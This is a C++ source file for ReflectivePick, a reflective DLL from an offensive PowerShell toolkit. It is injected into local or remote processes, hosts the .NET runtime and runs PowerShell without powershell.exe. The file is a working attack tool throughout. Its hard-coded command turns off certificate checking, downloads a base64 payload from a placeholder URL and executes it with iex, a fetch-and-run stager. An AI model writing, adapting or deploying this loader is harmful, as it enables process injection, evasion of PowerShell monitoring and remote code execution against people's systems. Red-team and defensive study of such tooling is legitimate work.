/*
 * ReflectivePick
 * Description: This DLL loads is reflectively loaded into a local/remote process to introduce and run powershell code. Made to be used with 
 * PSInject.ps1 to basically add migrate/inject capability to powershell. 
 * 
 * THIS CODE IS ALMOST ENTIRELY FROM UnmanagedPowerShell by Lee Christensen (@tifkin_). It was transformed from an exe format into a 
 * Reflective DLL to be used within the PowerPick project. Please recognize that credit for the disovery of this method of running PS code
 * from C++ and all code contained within was his original work. The original executable can be found here: https://github.com/leechristensen/UnmanagedPowerShell
 *
 * License: 3-Clause BSD License. See Veil PowerTools Project
 * 
 * This application is part of Veil PowerTools, a collection of offensive PowerShell 
 * capabilities. Hope they help! 
 * 
 * This is part of a sub-repo of PowerPick, a toolkit used to run PowerShell code without the use of Powershell.exe 
 */

#include "stdafx.h"
#pragma region Includes and Imports
#include <windows.h>
#include <comdef.h>
#include <mscoree.h>
#include "PowerShellRunnerDll.h"

#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library).
#import "mscorlib.tlb" raw_interfaces_only				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;
#pragma endregion



extern const unsigned int PowerShellRunner_dll_len;
extern unsigned char PowerShellRnuner_dll[];
void InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command);

extern "C" __declspec( dllexport ) void VoidFunc()
{

	HRESULT hr;

	ICLRMetaHost *pMetaHost = NULL;
	ICLRRuntimeInfo *pRuntimeInfo = NULL;
	ICorRuntimeHost *pCorRuntimeHost = NULL;

	IUnknownPtr spAppDomainThunk = NULL;
	_AppDomainPtr spDefaultAppDomain = NULL;

	// The .NET assembly to load.
	bstr_t bstrAssemblyName("PowerShellRunner");
	_AssemblyPtr spAssembly = NULL;

	// The .NET class to instantiate.
	bstr_t bstrClassName("PowerShellRunner.PowerShellRunner");
	_TypePtr spType = NULL;


	// Start the runtime
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
	if (FAILED(hr))
	{
		wprintf(L"CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = pMetaHost->GetRuntime(L"v2.0.50727", IID_PPV_ARGS(&pRuntimeInfo));
	if (FAILED(hr))
	{
		wprintf(L"ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Check if the specified runtime can be loaded into the process.
	BOOL fLoadable;
	hr = pRuntimeInfo->IsLoadable(&fLoadable);
	if (FAILED(hr))
	{
		wprintf(L"ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	if (!fLoadable)
	{
		wprintf(L".NET runtime v2.0.50727 cannot be loaded\n");
		goto Cleanup;
	}

	// Load the CLR into the current process and return a runtime interface
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost,
		IID_PPV_ARGS(&pCorRuntimeHost));
	if (FAILED(hr))
	{
		wprintf(L"ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Start the CLR.
	hr = pCorRuntimeHost->Start();
	if (FAILED(hr))
	{
		wprintf(L"CLR failed to start w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}


	// Get a pointer to the default AppDomain in the CLR.
	hr = pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk);
	if (FAILED(hr))
	{
		wprintf(L"ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));
	if (FAILED(hr))
	{
		wprintf(L"Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Load the .NET assembly.
	// (Option 1) Load it from disk - usefully when debugging the PowerShellRunner app (you'll have to copy the DLL into the same directory as the exe)
	//hr = spDefaultAppDomain->Load_2(bstrAssemblyName, &spAssembly);
	
	// (Option 2) Load the assembly from memory
	SAFEARRAYBOUND bounds[1];
	bounds[0].cElements = PowerShellRunner_dll_len;
	bounds[0].lLbound = 0;

	SAFEARRAY* arr = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(arr);
	memcpy(arr->pvData, PowerShellRunner_dll, PowerShellRunner_dll_len);
	SafeArrayUnlock(arr);

	hr = spDefaultAppDomain->Load_3(arr, &spAssembly);

	if (FAILED(hr))
	{
		wprintf(L"Failed to load the assembly w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Get the Type of PowerShellRunner.
	hr = spAssembly->GetType_2(bstrClassName, &spType);
	if (FAILED(hr))
	{
		wprintf(L"Failed to get the Type interface w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Call the static method of the class
	wchar_t* argument = L"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"))))";

	//Output debug
	//DWORD pid = GetCurrentProcessId();
	//wchar_t msg[100];
	//swprintf_s(msg,L"Powershell running from pid %d!",pid);
	//MessageBox(NULL,msg,L"Info",MB_OK);
	
	InvokeMethod(spType, L"InvokePS", argument);

Cleanup:

	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}
	if (pCorRuntimeHost)
	{
		pCorRuntimeHost->Release();
		pCorRuntimeHost = NULL;
	}

	return;
}

void InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command)
{
	HRESULT hr;
	bstr_t bstrStaticMethodName(method);
	SAFEARRAY *psaStaticMethodArgs = NULL;
	variant_t vtStringArg(command);
	variant_t vtPSInvokeReturnVal;
	variant_t vtEmpty;


	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	LONG index = 0;
	hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg);
	if (FAILED(hr))
	{
		wprintf(L"SafeArrayPutElement failed w/hr 0x%08lx\n", hr);
		return;
	}

	// Invoke the method from the Type interface.
	hr = spType->InvokeMember_3(
		bstrStaticMethodName, 
		static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public), 
		NULL, 
		vtEmpty, 
		psaStaticMethodArgs, 
		&vtPSInvokeReturnVal);

	if (FAILED(hr))
	{
		wprintf(L"Failed to invoke InvokePS w/hr 0x%08lx\n", hr);
		return;
	}
	else
	{
		// Print the output of the command
		wprintf(vtPSInvokeReturnVal.bstrVal);
	}


	SafeArrayDestroy(psaStaticMethodArgs);
	psaStaticMethodArgs = NULL;
}
